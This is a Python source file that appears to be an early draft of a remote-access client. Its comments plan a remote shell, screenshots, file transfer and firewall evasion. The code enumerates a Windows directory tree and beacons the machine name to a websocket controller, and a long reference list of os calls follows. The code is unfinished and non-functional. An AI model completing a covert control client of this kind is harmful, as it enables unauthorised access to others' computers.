import os

from websocket import WebSocket
from platform import node

op = os.path
# make requests to pi so that firewall dont block and that it can leave 
# remote shell
# screenshot
# file transfer, use classes for this? built file tree, download file, upload file, list dir
"""
class fileSystemInteraction:
    def __init__(self, dirPath):
        self.

os.path.isfile(path)  # Check if path is a file
os.path.isdir(path)   # Check if path is a directory
"""

"""
dir: {}
file: 1
unknown: 2
"""

def buildDirectory(path, recursive=False):
    if path == None: path = "c:\\"

    try:
        listing = os.listdir(path)
    except FileNotFoundError:
        return "Directory not found!"
    
    dirMap = {}

    for item in listing:
        fullItemPath = op.join(path, item)

        if op.isdir(fullItemPath):
            if recursive:
                dirMap[item] = buildDirectory(fullItemPath, recursive=True)
            else:
                dirMap[item] = {}
        elif op.isfile(fullItemPath):
            dirMap[item] = 1
        else:
            dirMap[item] = 2

# Connect to controller

ws = WebSocket()
ws.connect("ws://127.0.0.1:8765")
ws.send(f"CONNECT: {node()} KEY: OmG") # Include machine name and a key to connect 
res = ws.recv()
# Retry every few mins instead of quitting
if res != "SUCCESS":
    print("Could not connect.")
    quit()

while True:
    command = "" 
    ws.send(command)
    
    res = ws.recv()
    print("Received:", res)


"""

# Import the os module at the beginning of your Python script
import os

# Checking Directory Information
os.getcwd()          # Get the current working directory
os.chdir(path)       # Change the current working directory

# Listing Files and Directories
os.listdir(path)     # List files and directories in a specified path

# Directory Manipulation
os.mkdir(path)       # Create a new directory
os.makedirs(path)    # Create multiple directories, including parent directories
os.rmdir(path)       # Remove an empty directory
os.removedirs(path)  # Remove directory and any empty parent directories

# File and Directory Existence
os.path.exists(path)  # Check if a file or directory exists
os.path.isfile(path)  # Check if path is a file
os.path.isdir(path)   # Check if path is a directory

# File and Directory Renaming
os.rename(src, dst)   # Rename a file or directory from source to destination

# File and Directory Deletion
os.remove(path)      # Remove a file
os.unlink(path)      # Alias for remove
os.rmdir(path)       # Remove an empty directory
os.removedirs(path)  # Remove directory and any empty parent directories

# Path Manipulation
os.path.join(path, filename)     # Join paths and filename to create a complete path
os.path.abspath(path)            # Get the absolute path of a file or directory
os.path.dirname(path)            # Get the directory part of a path
os.path.basename(path)           # Get the file or directory name from a path

# File Information
os.path.getsize(path)          # Get the size of a file in bytes
os.path.getctime(path)         # Get the creation time of a file
os.path.getmtime(path)         # Get the modification time of a file
os.path.islink(path)           # Check if path is a symbolic link
os.path.realpath(path)         # Get the real path of a symbolic link

# Directory Traversal
for root, dirs, files in os.walk(topdir):
    # Traverse directories and files in a directory tree
    pass

# Path Splitting
os.path.split(path)             # Split a path into directory and file
os.path.splitext(filename)      # Split a filename into name and extension

# Check if a Path is an Absolute Path
os.path.isabs(path)

# Directory Permission Control (Unix-only)
os.chmod(path, mode)            # Change the permissions of a file or directory


"""